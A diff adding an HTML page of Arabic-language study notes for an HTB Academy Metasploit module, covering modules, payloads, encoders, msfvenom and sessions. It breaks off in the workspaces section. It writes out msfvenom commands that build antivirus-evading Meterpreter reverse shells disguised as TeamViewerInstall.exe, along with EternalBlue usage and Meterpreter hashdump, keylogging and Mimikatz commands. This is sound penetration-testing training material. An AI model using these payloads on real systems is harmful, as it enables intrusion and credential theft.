@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Metasploit Framework — HTB Academy</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;600;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#030810;--border:#0e2035;--accent:#00d4ff;--green:#39ff14;--red:#FF5757;--yellow:#fbbf24;--purple:#a855f7;--text:#b8ccd8;--muted:#3a5060;--white:#e8f4ff;--mono:'IBM Plex Mono',monospace;--sans:'Rajdhani',sans-serif;--tag:'Share Tech Mono',monospace;}
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{background:url('https://raw.githubusercontent.com/husein690/roadmap/main/assets/kuggen.jpg') no-repeat center center fixed!important;background-size:cover!important;background-color:#030810!important;}
+body::before{content:''!important;position:fixed!important;inset:0!important;background:rgba(2,6,14,0.72)!important;z-index:0!important;display:block!important;pointer-events:none!important;}
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(0,212,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.02) 1px,transparent 1px);background-size:40px 40px;}
+body{color:var(--text);font-family:var(--sans);min-height:100vh;}
+#glass-particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;}
+.wrap{max-width:1000px;margin:0 auto;padding:32px 18px 80px;position:relative;z-index:2;}
+.back-btn{display:inline-flex;align-items:center;gap:8px;font-family:var(--tag);font-size:10px;letter-spacing:2px;color:var(--muted);text-decoration:none;padding:6px 14px;border:1px solid var(--muted);margin-bottom:28px;transition:all .2s;}
+.back-btn:hover{color:var(--accent);border-color:var(--accent);}
+.hdr{margin-bottom:32px;}
+.hdr-tag{font-family:var(--tag);font-size:10px;color:var(--green);letter-spacing:5px;margin-bottom:12px;animation:blink 2.5s infinite;}
+@keyframes blink{0%,100%{opacity:1}55%{opacity:.3}}
+.hdr-name{font-family:var(--mono);font-size:clamp(22px,4vw,40px);font-weight:700;color:var(--white);letter-spacing:-1px;text-shadow:0 0 40px rgba(0,212,255,.3);}
+.hdr-name span{color:var(--accent);}
+.hdr-sub{font-family:var(--tag);font-size:10px;color:var(--muted);letter-spacing:3px;margin-top:8px;}
+.divider{height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);margin:16px 0;opacity:.3;}
+.facts-bar{display:flex;flex-wrap:wrap;margin-bottom:28px;background:rgba(8,18,36,0.52);backdrop-filter:blur(18px);border:1px solid rgba(0,212,255,0.18);box-shadow:0 4px 30px rgba(0,0,0,.35);}
+.fact{flex:1;min-width:100px;padding:12px 16px;border-left:1px solid var(--border);}
+.fact:last-child{border-left:none;}
+.fact-val{font-family:var(--mono);font-size:15px;font-weight:700;color:var(--accent);}
+.fact-lbl{font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;margin-top:3px;}
+.nav{display:flex;flex-wrap:wrap;gap:0;margin-bottom:24px;border-bottom:1px solid var(--border);}
+.nav-btn{font-family:var(--tag);font-size:10px;letter-spacing:1px;padding:10px 14px;background:none;border:none;border-bottom:2px solid transparent;color:var(--muted);cursor:pointer;transition:all .2s;white-space:nowrap;}
+.nav-btn:hover{color:var(--accent);border-bottom-color:var(--accent);}
+.nav-btn.active{color:var(--accent);border-bottom-color:var(--accent);background:rgba(0,212,255,.05);}
+.panel{display:none;}
+.panel.active{display:block;}
+.sec-label{font-family:var(--tag);font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin:20px 0 10px;display:flex;align-items:center;gap:10px;}
+.sec-label::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--border),transparent);}
+.card{background:rgba(8,18,36,0.48);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,.08);padding:18px;margin-bottom:14px;position:relative;}
+.card::before{content:'';position:absolute;top:0;right:0;width:3px;height:100%;background:var(--accent);opacity:.4;}
+.card.danger::before{background:var(--red);opacity:.6;}
+.card.success::before{background:var(--green);opacity:.6;}
+.card.warn::before{background:var(--yellow);opacity:.6;}
+.card.purple::before{background:var(--purple);opacity:.6;}
+.card-title{font-family:var(--tag);font-size:10px;letter-spacing:2px;color:var(--accent);margin-bottom:12px;text-transform:uppercase;}
+.card-title::before{content:'▸ ';color:var(--green);}
+.code{background:rgba(1,4,9,0.8);border:1px solid var(--border);border-right:3px solid var(--accent);padding:14px;font-family:var(--mono);font-size:11px;color:var(--text);direction:ltr;text-align:left;overflow-x:auto;white-space:pre;line-height:1.7;margin:8px 0;}
+.code .cmd{color:var(--accent);}
+.code .ok{color:var(--green);}
+.code .err{color:var(--red);}
+.code .cmt{color:var(--muted);}
+.code .val{color:var(--yellow);}
+.code .purple{color:var(--purple);}
+table{width:100%;border-collapse:collapse;font-size:11px;margin:10px 0;}
+th{background:rgba(1,4,9,0.8);color:var(--accent);padding:8px 12px;text-align:right;border:1px solid var(--border);font-family:var(--tag);font-size:9px;letter-spacing:1px;text-transform:uppercase;}
+td{padding:7px 12px;border:1px solid var(--border);color:var(--text);font-size:11px;vertical-align:top;}
+tr:nth-child(even) td{background:rgba(8,15,28,0.5);}
+tr:nth-child(odd) td{background:rgba(1,4,9,0.4);}
+td.mono{font-family:var(--mono);color:var(--accent);}
+td.danger{color:var(--red);}
+td.safe{color:var(--green);}
+td.warn{color:var(--yellow);}
+td.purple{color:var(--purple);}
+.alert{padding:10px 14px;font-size:11px;margin:8px 0;border-right:3px solid;line-height:1.6;}
+.alert.danger{background:rgba(255,87,87,.08);border-color:var(--red);color:#ff9999;}
+.alert.info{background:rgba(0,212,255,.08);border-color:var(--accent);color:#99e8ff;}
+.alert.warning{background:rgba(251,191,36,.08);border-color:var(--yellow);color:#ffe599;}
+.alert.success{background:rgba(57,255,20,.08);border-color:var(--green);color:#99ff99;}
+.alert.purple{background:rgba(168,85,247,.08);border-color:var(--purple);color:#d8b4fe;}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:10px 0;}
+.info-box{background:rgba(1,4,9,0.6);border:1px solid var(--border);padding:12px;}
+.info-box-title{font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;}
+.chain{display:flex;align-items:center;flex-wrap:wrap;margin:12px 0;gap:4px;}
+.chain-step{flex:1;min-width:80px;background:rgba(8,18,36,0.5);border:1px solid var(--border);padding:10px 8px;text-align:center;}
+.chain-step .step-icon{font-size:18px;margin-bottom:4px;}
+.chain-step .step-name{color:var(--text);font-size:10px;font-family:var(--tag);}
+.chain-step .step-sub{color:var(--muted);font-size:9px;margin-top:2px;}
+.chain-step.hl{border-color:var(--red);background:rgba(255,87,87,.05);}
+.chain-step.green{border-color:var(--green);background:rgba(57,255,20,.05);}
+.chain-arrow{color:var(--accent);font-size:14px;}
+.qa{margin:10px 0;}
+.qa-q{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.2);padding:10px 14px;margin-bottom:6px;font-size:12px;color:var(--accent);}
+.qa-q::before{content:'❓ سؤال: ';color:var(--yellow);}
+.qa-a{background:rgba(57,255,20,.05);border:1px solid rgba(57,255,20,.2);padding:10px 14px;margin-bottom:10px;font-size:12px;color:var(--text);line-height:1.6;}
+.qa-a::before{content:'✅ الجواب: ';color:var(--green);}
+.lbl{font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin:10px 0 6px;}
+.badge{display:inline-block;font-family:var(--tag);font-size:9px;padding:2px 8px;border:1px solid;letter-spacing:1px;margin:2px;}
+.badge.cyan{border-color:rgba(0,212,255,.3);color:var(--accent);}
+.badge.green{border-color:rgba(57,255,20,.3);color:var(--green);}
+.badge.red{border-color:rgba(255,87,87,.3);color:var(--red);}
+.badge.yellow{border-color:rgba(251,191,36,.3);color:var(--yellow);}
+.badge.purple{border-color:rgba(168,85,247,.3);color:var(--purple);}
+@media(max-width:600px){.grid-2{grid-template-columns:1fr;}.chain{flex-direction:column;}}
+</style>
+</head>
+<body>
+<canvas id="glass-particles"></canvas>
+<div class="wrap">
+
+<a href="pentesting_tools.html" class="back-btn">◄ BACK TO TOOLS</a>
+
+<div class="hdr">
+  <div class="hdr-tag">► HTB ACADEMY · MODULE 39 · USING THE METASPLOIT FRAMEWORK</div>
+  <div class="hdr-name">METASPLOIT <span>FRAMEWORK</span></div>
+  <div class="hdr-sub">EXPLOITATION · PAYLOADS · ENCODERS · POST-EXPLOITATION · SESSIONS</div>
+  <div class="divider"></div>
+</div>
+
+<div class="facts-bar">
+  <div class="fact"><div class="fact-val">Ruby</div><div class="fact-lbl">Language</div></div>
+  <div class="fact"><div class="fact-val">MSF</div><div class="fact-lbl">Free Version</div></div>
+  <div class="fact"><div class="fact-val">7</div><div class="fact-lbl">Module Types</div></div>
+  <div class="fact"><div class="fact-val">msfvenom</div><div class="fact-lbl">Payload Tool</div></div>
+  <div class="fact"><div class="fact-val" style="color:var(--purple)">Meterpreter</div><div class="fact-lbl">Advanced Shell</div></div>
+  <div class="fact"><div class="fact-val" style="color:var(--green)">PostgreSQL</div><div class="fact-lbl">Database</div></div>
+</div>
+
+<div class="nav">
+  <button class="nav-btn active" onclick="showPanel('overview',this)">Overview</button>
+  <button class="nav-btn" onclick="showPanel('modules',this)">Modules</button>
+  <button class="nav-btn" onclick="showPanel('payloads',this)">Payloads</button>
+  <button class="nav-btn" onclick="showPanel('encoders',this)">Encoders</button>
+  <button class="nav-btn" onclick="showPanel('msfvenom',this)">msfvenom</button>
+  <button class="nav-btn" onclick="showPanel('sessions',this)">Sessions & Jobs</button>
+  <button class="nav-btn" onclick="showPanel('database',this)">Database</button>
+  <button class="nav-btn" onclick="showPanel('methodology',this)">Methodology</button>
+  <button class="nav-btn" onclick="showPanel('explained',this)">Q&A</button>
+</div>
+
+<!-- ═══════════════════════════════════
+     OVERVIEW
+═══════════════════════════════════ -->
+<div id="panel-overview" class="panel active">
+
+  <div class="card">
+    <div class="card-title">ما هو Metasploit؟</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:14px;">
+      منصة pentest modular مبنية على Ruby. تحتوي آلاف الـ exploits والـ payloads والـ auxiliary modules. كل الملفات في <span style="font-family:var(--mono);color:var(--accent)">/usr/share/metasploit-framework/</span>
+    </p>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">MSF vs MSF Pro</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          <span style="color:var(--green);">Framework:</span> مجاني + command line<br>
+          كل الـ exploits والـ modules<br><br>
+          <span style="color:var(--yellow);">Pro (مدفوع):</span> GUI + تقارير تلقائية<br>
+          Social Engineering + Team work<br>
+          للشركات الكبيرة
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">تحذير مهم</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          <span style="color:var(--red);">Tunnel Vision Effect:</span><br>
+          "لو الأداة ما تقدر = أنا ما أقدر"<br><br>
+          Metasploit = أداة مساعدة<br>
+          <span style="color:var(--green);">مش بديل عن الفهم! ✅</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">⛓️ MSF Engagement Structure — 5 مراحل</div>
+    <div class="chain">
+      <div class="chain-step"><div class="step-icon">🔍</div><div class="step-name">Enumeration</div><div class="step-sub">شوف إيش شغّال</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">📋</div><div class="step-name">Preparation</div><div class="step-sub">جهّز الـ exploit</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">💥</div><div class="step-name">Exploitation</div><div class="step-sub">نفّذ الهجوم</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">⬆️</div><div class="step-name">PrivEsc</div><div class="step-sub">ارفع الصلاحيات</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step hl"><div class="step-icon">🏴</div><div class="step-name">Post-Exploit</div><div class="step-sub">استغل الوصول</div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">💻 تشغيل msfconsole</div>
+    <div class="code"><span class="cmd">msfconsole</span>       <span class="cmt"># مع الـ splash art</span>
+<span class="cmd">msfconsole -q</span>    <span class="cmt"># بدون splash art (أسرع)</span>
+
+<span class="cmt"># داخل الـ console:</span>
+msf6 > <span class="cmd">help</span>
+msf6 > <span class="cmd">search eternalblue</span>
+msf6 > <span class="cmd">use 0</span>              <span class="cmt"># استخدام بالرقم</span>
+msf6 > <span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span></div>
+  </div>
+
+</div>
+
+<!-- ═══════════════════════════════════
+     MODULES
+═══════════════════════════════════ -->
+<div id="panel-modules" class="panel">
+
+  <div class="card">
+    <div class="card-title">📦 Module Syntax</div>
+    <div class="code"><span class="cmt"># الصيغة الكاملة:</span>
+&lt;No.&gt; <span class="val">type</span>/<span class="ok">os</span>/<span class="cmd">service</span>/<span class="purple">name</span>
+
+<span class="cmt"># مثال:</span>
+794  <span class="val">exploit</span>/<span class="ok">windows</span>/<span class="cmd">smb</span>/<span class="purple">ms17_010_eternalblue</span>
+      ↓        ↓        ↓    ↓
+    النوع    الـ OS  الخدمة  اسم الثغرة</div>
+
+    <table>
+      <tr><th>الجزء</th><th>الوصف</th><th>أمثلة</th></tr>
+      <tr><td class="mono">Type</td><td>نوع الـ module</td><td class="mono">exploit, auxiliary, post</td></tr>
+      <tr><td class="mono">OS</td><td>نظام التشغيل المستهدف</td><td class="mono">windows, linux, multi, osx</td></tr>
+      <tr><td class="mono">Service</td><td>الخدمة المستهدفة</td><td class="mono">smb, http, ftp, ssh</td></tr>
+      <tr><td class="mono">Name</td><td>اسم الثغرة/الأداة</td><td class="mono">ms17_010_eternalblue</td></tr>
+    </table>
+    <div class="alert info">💡 الـ Index No. (رقم الـ module) تقدر تستخدمه بدل الاسم الطويل: <span style="font-family:var(--mono)">use 794</span></div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">7 أنواع الـ Modules</div>
+    <table>
+      <tr><th>النوع</th><th>الوظيفة</th><th>مثال على الاستخدام</th></tr>
+      <tr><td class="mono safe">Auxiliary</td><td>Scanning, fuzzing, sniffing, brute force</td><td class="mono">auxiliary/scanner/smb/smb_ms17_010</td></tr>
+      <tr><td class="mono warn">Encoders</td><td>تشفير الـ payloads — AV evasion</td><td class="mono">x86/shikata_ga_nai</td></tr>
+      <tr><td class="mono danger">Exploits</td><td>استغلال الثغرات الفعلية</td><td class="mono">exploit/windows/smb/ms17_010_eternalblue</td></tr>
+      <tr><td class="mono" style="color:var(--muted)">NOPs</td><td>No Operation — يحافظ على حجم الـ payload</td><td class="mono">x86/single_byte</td></tr>
+      <tr><td class="mono purple">Payloads</td><td>الكود اللي يشتغل بعد الاختراق</td><td class="mono">windows/x64/meterpreter/reverse_tcp</td></tr>
+      <tr><td class="mono" style="color:var(--accent)">Plugins</td><td>إضافات تتكامل مع msfconsole</td><td class="mono">nessus.rb, openvas.rb</td></tr>
+      <tr><td class="mono" style="color:var(--yellow)">Post</td><td>Post-exploitation: pivot، جمع معلومات</td><td class="mono">post/multi/recon/local_exploit_suggester</td></tr>
+    </table>
+    <div class="alert warning">⚠️ <strong>Initiators:</strong> الأوامر use &lt;no.&gt; تشتغل فقط مع: Auxiliary, Exploits, Post — مش مع Encoders أو NOPs</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔍 البحث والتصفية</div>
+    <div class="code"><span class="cmt"># بحث بسيط:</span>
+msf6 > <span class="cmd">search eternalblue</span>
+msf6 > <span class="cmd">search type:exploit platform:windows smb</span>
+
+<span class="cmt"># تصفية بـ grep:</span>
+msf6 exploit(ms17_010_eternalblue) > <span class="cmd">grep meterpreter show payloads</span>
+msf6 exploit(ms17_010_eternalblue) > <span class="cmd">grep meterpreter grep reverse_tcp show payloads</span>
+
+<span class="cmt"># شوف الـ options:</span>
+msf6 exploit(ms17_010_eternalblue) > <span class="cmd">show options</span>
+msf6 exploit(ms17_010_eternalblue) > <span class="cmd">show encoders</span>
+msf6 exploit(ms17_010_eternalblue) > <span class="cmd">show payloads</span></div>
+    <div class="alert info">💡 الفرق المهم: auxiliary/scanner/smb/smb_ms17_010 = يفحص فقط. exploit/windows/smb/ms17_010_eternalblue = يهاجم!</div>
+  </div>
+
+</div>
+
+<!-- ═══════════════════════════════════
+     PAYLOADS
+═══════════════════════════════════ -->
+<div id="panel-payloads" class="panel">
+
+  <div class="card">
+    <div class="card-title">إيش هو الـ Payload؟</div>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">Exploit vs Payload</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          <span style="color:var(--red);">Exploit:</span> يفتح الباب<br>
+          يستغل الثغرة في البرنامج<br><br>
+          <span style="color:var(--purple);">Payload:</span> ماذا تفعل بعد الدخول<br>
+          Reverse Shell, Meterpreter...
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">تشبيه</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          Exploit = مفتاح يفتح الباب<br><br>
+          Payload = ماذا تفعل داخل البيت<br>
+          (تسرق، تفتح باب خلفي، تثبّت نفسك...)
+        </div>
+      </div>
+    </div>
+    <div class="alert info">💡 تعرف نوع الـ payload من الـ slash: <br>
+    <span style="font-family:var(--mono);">windows/shell_bind_tcp</span> ← Single (بدون /)<br>
+    <span style="font-family:var(--mono);">windows/shell/bind_tcp</span> ← Staged (مع /)</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">3 أنواع الـ Payloads</div>
+    <table>
+      <tr><th>النوع</th><th>الوصف</th><th>المميزات</th><th>العيوب</th></tr>
+      <tr>
+        <td class="mono safe">Singles</td>
+        <td>كود كامل مستقل في ملف واحد</td>
+        <td class="safe">مستقر جداً، يعطي النتيجة فوراً</td>
+        <td class="danger">حجم كبير، بعض الثغرات ما تستحمله</td>
+      </tr>
+      <tr>
+        <td class="mono warn">Stagers</td>
+        <td>كود صغير يفتح اتصال ويستقبل Stage</td>
+        <td class="safe">حجم صغير، يتجاوز الـ Firewall</td>
+        <td class="warn">يحتاج اتصال ثاني للـ Stage</td>
+      </tr>
+      <tr>
+        <td class="mono purple">Stages</td>
+        <td>أكواد ضخمة متقدمة (Meterpreter)</td>
+        <td class="safe">ميزات غير محدودة، قوية جداً</td>
+        <td class="warn">يحتاج Stager لتنزيله</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="card purple">
+    <div class="card-title">👑 Meterpreter — أقوى Payload</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:12px;">
+      يشتغل بتقنية <strong style="color:var(--purple);">DLL Injection</strong> — يعيش كاملاً في الذاكرة (RAM) ولا يكتب أي ملفات على الهارد ديسك = Antivirus وForensics ما يشوفونه!
+    </p>
+    <div class="lbl">أوامر Meterpreter المهمة:</div>
+    <div class="code"><span class="cmd">getuid</span>           <span class="cmt"># بدل whoami في Windows</span>
+<span class="cmd">sysinfo</span>          <span class="cmt"># معلومات الجهاز</span>
+<span class="cmd">hashdump</span>         <span class="cmt"># سرقة الـ password hashes</span>
+<span class="cmd">keyscan_start</span>    <span class="cmt"># تسجيل ضربات الكيبورد</span>
+<span class="cmd">screenshot</span>       <span class="cmt"># لقطة شاشة</span>
+<span class="cmd">getsystem</span>        <span class="cmt"># محاولة رفع صلاحيات لـ SYSTEM</span>
+<span class="cmd">load kiwi</span>        <span class="cmt"># تحميل Mimikatz لسرقة كلمات السر</span>
+<span class="cmd">shell</span>            <span class="cmt"># فتح CMD عادي داخل Meterpreter</span>
+<span class="cmd">background</span>       <span class="cmt"># إرسال الجلسة للخلفية</span></div>
+    <div class="alert success">🎯 getuid طلع NT AUTHORITY\SYSTEM = أعلى صلاحية في Windows!</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔄 Reverse vs Bind Connection</div>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">Bind TCP ❌</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;direction:ltr;margin-top:6px;">
+          أنت تتصل بالضحية<br>
+          ← Firewall يحجب Inbound<br>
+          = غالباً يفشل!
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">Reverse TCP ✅</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;direction:ltr;margin-top:6px;">
+          الضحية تتصل بك<br>
+          ← Firewall يثق بـ Outbound<br>
+          = يمر بسلام! 🎯
+        </div>
+      </div>
+    </div>
+    <div class="lbl">أشهر أنواع الـ Payloads:</div>
+    <table>
+      <tr><th>الـ Payload</th><th>الوظيفة</th></tr>
+      <tr><td class="mono">generic/shell_reverse_tcp</td><td>Shell عادي باتصال عكسي (multi-platform)</td></tr>
+      <tr><td class="mono">windows/x64/exec</td><td>ينفذ أمر واحد فقط</td></tr>
+      <tr><td class="mono">windows/x64/messagebox</td><td>يطلع رسالة popup</td></tr>
+      <tr><td class="mono purple">windows/x64/meterpreter/reverse_tcp</td><td>Meterpreter متطور ← الأفضل! 🎯</td></tr>
+      <tr><td class="mono">windows/x64/shell/reverse_tcp</td><td>Shell عادي (Stager + Stage)</td></tr>
+    </table>
+  </div>
+
+</div>
+
+<!-- ═══════════════════════════════════
+     ENCODERS
+═══════════════════════════════════ -->
+<div id="panel-encoders" class="panel">
+
+  <div class="card">
+    <div class="card-title">ما هي الـ Encoders؟</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:14px;">
+      تشفير الـ payloads عشان تكون متوافقة مع architectures مختلفة + تجاوز الـ Antivirus. تدعم: x64, x86, sparc, ppc, mips
+    </p>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">Shikata Ga Nai (SGN)</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          الاسم بالياباني: "لا يمكن فعل شيء"<br>
+          أشهر encoder في Metasploit<br>
+          Rank: <span style="color:var(--green);">excellent</span><br>
+          <span style="color:var(--red);">هلأ: الـ AV يكتشفه بسهولة!</span>
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">Bad Characters</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          Hex opcodes تكسر الـ payload<br>
+          <span style="color:var(--red);">\x00 = null byte (الأخطر)</span><br>
+          Encoder يزيلها تلقائياً<br>
+          <span style="font-family:var(--mono);color:var(--accent);">-b "\x00"</span> في msfvenom
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">💻 show encoders</div>
+    <div class="code"><span class="cmt"># شوف الـ encoders المتاحة للـ exploit الحالي:</span>
+msf6 exploit(ms17_010_eternalblue) > <span class="cmd">show encoders</span>
+
+Compatible Encoders
+===================
+ # Name                    Rank       Description
+ 0 generic/eicar           manual     EICAR Encoder
+ 1 generic/none            manual     The "none" Encoder
+ 2 x64/xor                 manual     XOR Encoder
+ 3 x64/xor_dynamic         manual     Dynamic key XOR Encoder
+ 4 x64/zutto_dekiru        manual     Zutto Dekiru</div>
+    <div class="alert info">💡 الـ encoders يتصفّى تلقائياً حسب الـ Architecture — x64 payload = x64 encoders فقط</div>
+  </div>
+
+</div>
+
+<!-- ═══════════════════════════════════
+     MSFVENOM
+═══════════════════════════════════ -->
+<div id="panel-msfvenom" class="panel">
+
+  <div class="card">
+    <div class="card-title">🔧 msfvenom — الأداة الشاملة</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:14px;">
+      بعد 2015 دمجوا msfpayload + msfencode في أداة واحدة: msfvenom. تولّد الـ payloads وتشفرها بأمر واحد.
+    </p>
+    <div class="lbl">الأوامر الأساسية:</div>
+    <div class="code"><span class="cmt"># Payload بدون encoding:</span>
+<span class="cmd">msfvenom -a x86 --platform windows \
+  -p windows/shell/reverse_tcp \
+  LHOST=127.0.0.1 LPORT=4444 \
+  -b "\x00" -f perl</span>
+
+<span class="cmt"># Payload مع encoding (SGN):</span>
+<span class="cmd">msfvenom -a x86 --platform windows \
+  -p windows/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=8080 \
+  -e x86/shikata_ga_nai \
+  -f exe -o ./TeamViewerInstall.exe</span>
+
+<span class="cmt"># مع iterations متعددة (أصعب للكشف):</span>
+<span class="cmd">msfvenom -a x86 --platform windows \
+  -p windows/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=8080 \
+  -e x86/shikata_ga_nai -i 10 \
+  -f exe -o ./TeamViewerInstall.exe</span>
+
+<span class="cmt"># تحليل الـ payload على VirusTotal:</span>
+<span class="cmd">msf-virustotal -k &lt;API_KEY&gt; -f TeamViewerInstall.exe</span></div>
+
+    <div class="alert danger">⚠️ حتى مع 10 iterations من SGN — 52/68 AV لا يزالون يكتشفونه! مفيدة للـ lab بس مش للـ production.</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📋 الخيارات المهمة في msfvenom</div>
+    <table>
+      <tr><th>الخيار</th><th>الوظيفة</th><th>مثال</th></tr>
+      <tr><td class="mono">-a</td><td>Architecture</td><td class="mono">x86, x64</td></tr>
+      <tr><td class="mono">--platform</td><td>نظام التشغيل</td><td class="mono">windows, linux</td></tr>
+      <tr><td class="mono">-p</td><td>اسم الـ payload</td><td class="mono">windows/meterpreter/reverse_tcp</td></tr>
+      <tr><td class="mono">LHOST</td><td>IP جهازك (المخترِق)</td><td class="mono">10.10.14.5</td></tr>
+      <tr><td class="mono">LPORT</td><td>Port جهازك</td><td class="mono">4444, 8080</td></tr>
+      <tr><td class="mono">-b</td><td>Bad characters تحذفها</td><td class="mono">"\x00"</td></tr>
+      <tr><td class="mono">-e</td><td>الـ encoder</td><td class="mono">x86/shikata_ga_nai</td></tr>
+      <tr><td class="mono">-i</td><td>عدد الـ iterations</td><td class="mono">10</td></tr>
+      <tr><td class="mono">-f</td><td>صيغة الـ output</td><td class="mono">exe, perl, python, raw</td></tr>
+      <tr><td class="mono">-o</td><td>اسم الملف الناتج</td><td class="mono">./payload.exe</td></tr>
+    </table>
+  </div>
+
+</div>
+
+<!-- ═══════════════════════════════════
+     SESSIONS & JOBS
+═══════════════════════════════════ -->
+<div id="panel-sessions" class="panel">
+
+  <div class="card">
+    <div class="card-title">🔗 Sessions — إدارة الاتصالات</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:12px;">
+      Session = خط الاتصال المفتوح بين جهازك والضحية. Metasploit تسمح بعشرات الجلسات في نفس الوقت.
+    </p>
+    <div class="code"><span class="cmt"># عرض كل الجلسات الشغالة:</span>
+msf6 > <span class="cmd">sessions</span>
+
+<span class="cmt"># إرسال الجلسة للخلفية (من داخل Meterpreter):</span>
+meterpreter > <span class="cmd">background</span>
+<span class="cmt"># أو: CTRL + Z</span>
+
+<span class="cmt"># العودة لجلسة محددة:</span>
+msf6 > <span class="cmd">sessions -i 1</span>    <span class="cmt"># رقم الجلسة</span>
+
+<span class="cmt"># قفل جلسة:</span>
+msf6 > <span class="cmd">sessions -k 1</span>
+
+<span class="cmt"># استخدام الجلسة في Post module:</span>
+msf6 post(local_exploit_suggester) > <span class="cmd">set SESSION 1</span></div>
+    <div class="alert warning">⚠️ Sessions can die! الجلسة تموت لو الضحية أغلق البرنامج أو في مشكلة في الشبكة.</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">⚙️ Jobs — المهام الخلفية</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:12px;">
+      Jobs = مهام تشتغل في الخلفية بشكل مستقل. مفيدة للـ listeners اللي لازم تفضل شغالة.
+    </p>
+    <div class="code"><span class="cmt"># تشغيل exploit كـ Job (في الخلفية):</span>
+msf6 exploit(multi/handler) > <span class="cmd">exploit -j</span>
+<span class="ok">[*] Exploit running as background job 0.</span>
+
+<span class="cmt"># عرض الـ Jobs الشغالة:</span>
+msf6 > <span class="cmd">jobs -l</span>
+
+<span class="cmt"># قفل job محدد:</span>
+msf6 > <span class="cmd">jobs -k 0</span>
+
+<span class="cmt"># قفل كل الـ Jobs:</span>
+msf6 > <span class="cmd">jobs -K</span></div>
+    <div class="alert info">💡 الفائدة الرئيسية: لو شغّلت listener على Port 4444 وحبيت تشغل module ثاني على نفس الـ Port، اعمل -j للأول وبعدين أقفله بـ jobs -k</div>
+  </div>
+
+</div>
+
+<!-- ═══════════════════════════════════
+     DATABASE
+═══════════════════════════════════ -->
+<div id="panel-database" class="panel">
+
+  <div class="card">
+    <div class="card-title">🗄️ PostgreSQL Database</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:12px;">
+      Metasploit يستخدم PostgreSQL لحفظ نتائج الـ scans والـ credentials والـ loot. مفيد جداً لو عندك شبكة كبيرة فيها 50+ جهاز.
+    </p>
+    <div class="code"><span class="cmt"># تشغيل PostgreSQL:</span>
+<span class="cmd">sudo systemctl start postgresql</span>
+
+<span class="cmt"># تهيئة قاعدة بيانات Metasploit:</span>
+<span class="cmd">sudo msfdb init</span>
+
+<span class="cmt"># تشغيل msfconsole مع DB:</span>
+<span class="cmd">sudo msfdb run</span>
+
+<span class="cmt"># التحقق من الاتصال:</span>
+msf6 > <span class="cmd">db_status</span>
+<span class="ok">[*] Connected to msf. Connection type: postgresql.</span></div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📁 Workspaces</div>
+    <div class="code"><span class="cmt"># شوف الـ workspaces:</span>
+msf6 > <span class="cmd">workspace</span>
+<span class="ok">* default</span>
+
